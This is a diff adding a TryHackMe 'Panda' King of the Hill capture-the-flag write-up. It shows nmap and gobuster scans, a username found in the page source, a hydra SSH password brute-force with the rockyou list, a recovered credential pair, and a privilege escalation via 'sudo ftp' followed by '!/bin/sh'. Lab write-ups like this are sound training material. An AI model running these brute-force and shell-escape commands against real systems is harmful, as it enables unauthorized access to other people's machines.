@@ -1,3 +1,14 @@
+# TryHackMe Panda King Of The Hill Writeup
+
+---
+
+## Nmap Scan
+
+```
+nmap -sCV -Pn MACHINE_IP
+```
+
+
 ```ruby
 PORT     STATE SERVICE     VERSION
 22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
@@ -31,6 +42,13 @@ PORT     STATE SERVICE     VERSION
 
 ```
 
+---
+
+## Gobuster 
+
+```
+gobuster dir -w /home/kali/Downloads/wordlists/directory-list-2.3-medium.txt -u http://10.128.129.254
+```
 
 
 ```
@@ -52,36 +70,69 @@ Finished
 ===============================================================
 ```
 
+<details>
+  <summary>First way to get into system</summary>
+
+
+
+## open website 
+
 ```
-/var/www/html/wordpress/wp-includes/images/icon-pointer-flag.png
-/var/www/html/wordpress/wp-includes/images/icon-pointer-flag-2x.png
-/var/www/html/06d63d6798d9b6c2f987f045b12031d6/flag
-/usr/bin/pflags
+http://10.128.129.254
+```
 
+> ## in source code found username call **`sheffo`**
 
-/usr/local/go/src/cmd/go/internal/test/testflag.go
-/usr/local/go/src/cmd/go/internal/vet/vetflag.go
-/usr/local/go/src/cmd/go/testdata/script/build_gcflags.txt
-/usr/local/go/src/cmd/go/testdata/script/build_runtime_gcflags.txt
-/usr/local/go/src/cmd/go/testdata/script/gcflags_patterns.txt
-/usr/local/go/src/cmd/go/testdata/script/goflags.txt
-/usr/local/go/src/cmd/go/testdata/script/modfile_flag.txt
-/usr/local/go/src/cmd/go/testdata/script/test_flag.txt
-/usr/local/go/src/cmd/go/testdata/script/vet_flags.txt
+## brute force the password using hydra
 
-
-
+```
+hydra -l sheffo -P /usr/share/wordlists/rockyou.txt ssh://10.10.24.15
 ```
 
 
 
+```
+shifoo : batman
+```
+
+
+
+
+  
+</details>
 
 
 
 
 
 
+---
+---
+---
+---
 
+
+
+
+
+
+<details>
+  <summary>Firts way to PrivEsc</summary>
+
+```
+sudo -l
+```
+
+> ## found **`Ftp`**
+
+
+```
+sudo ftp
+!/bin/sh
+```
+
+  
+</details>
 
 
 
